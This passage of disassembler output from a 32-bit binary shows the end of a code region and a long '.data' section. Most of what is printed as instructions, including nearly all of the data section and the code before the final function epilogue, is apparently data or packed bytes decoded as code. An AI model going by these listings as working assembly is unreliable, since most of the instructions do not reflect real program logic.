  4113ce:	fst    QWORD PTR [edi-0x40]
  4113d1:	repnz les esp,FWORD PTR [edi-0x35]
  4113d5:	pop    ebx
  4113d6:	sbb    ah,BYTE PTR [eax-0x1bda0aa1]
  4113dc:	jp     0x411432
  4113de:	cld    
  4113df:	jb     0x4113a7
  4113e1:	das    
  4113e2:	out    dx,al
  4113e3:	in     al,dx
  4113e4:	shl    BYTE PTR [esi],cl
  4113e6:	sbb    al,0x8c
  4113e8:	idiv   BYTE PTR [eax]
  4113ea:	push   ds
  4113eb:	test   ch,ah
  4113ed:	xor    cl,bl
  4113ef:	ja     0x411420
  4113f1:	xor    al,0xc9
  4113f3:	addr16 pop eax
  4113f5:	xchg   DWORD PTR [eax-0x1a],edx
  4113f8:	jmp    0x411439
  4113fa:	cs idiv ecx
  4113fd:	arpl   WORD PTR [esi-0x128e0529],ax
  411403:	cs xor eax,0xdddb4d52
  411409:	cmp    eax,DWORD PTR [ebp-0x2c]
  41140c:	hlt    
  41140d:	xchg   DWORD PTR [edx+ecx*1-0x15],ecx
  411411:	repz jo 0x4113e9
  411414:	(bad)  
  411415:	out    dx,al
  411416:	popa   
  411417:	fbstp  TBYTE PTR [edx+eiz*2]
  41141a:	ins    DWORD PTR es:[edi],dx
  41141b:	stc    
  41141c:	repz cli 
  41141e:	cmp    BYTE PTR [edi+0x2fe3ee11],cl
  411424:	sub    eax,0x82e98bac
  411429:	cmp    eax,0xbf9cd6f3
  41142e:	sub    BYTE PTR [ecx-0x48],ah
  411431:	test   BYTE PTR [edi-0x6f],bl
  411434:	sbb    eax,0x5f0a4fe9
  411439:	dec    esi
  41143a:	xchg   ebx,eax
  41143b:	add    ebx,DWORD PTR [eax+0x25]
  41143e:	jns    0x41140e
  411440:	pop    ds
  411441:	jl     0x4113d9
  411443:	mov    al,0xb6
  411445:	rol    DWORD PTR [esi+0x5b42f779],1
  41144b:	inc    esi
  41144c:	scas   al,BYTE PTR es:[edi]
  41144d:	pop    esp
  41144e:	mov    ebx,0x83520b54
  411453:	repz mov dl,0xde
  411456:	repz adc ch,BYTE PTR [edx]
  411459:	cmp    eax,0x3e4ef8ee
  41145e:	idiv   BYTE PTR [edx+0x1a3d1e28]
  411464:	fcomip st,st(4)
  411466:	or     eax,0x6610a330
  41146b:	push   cs
  41146c:	mov    bl,0x4a
  41146e:	pushf  
  41146f:	push   edi
  411470:	pop    es
  411471:	fwait
  411472:	add    ebp,esi
  411474:	adc    al,0xef
  411476:	je     0x4114cd
  411478:	adc    DWORD PTR [eax-0x76],esp
  41147b:	xor    DWORD PTR [ebp+0x3434a86],ebx
  411481:	sbb    al,0x1a
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    al,BYTE PTR [ebx]
  412423:	add    BYTE PTR [edx],bh
  412425:	and    al,0x3
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
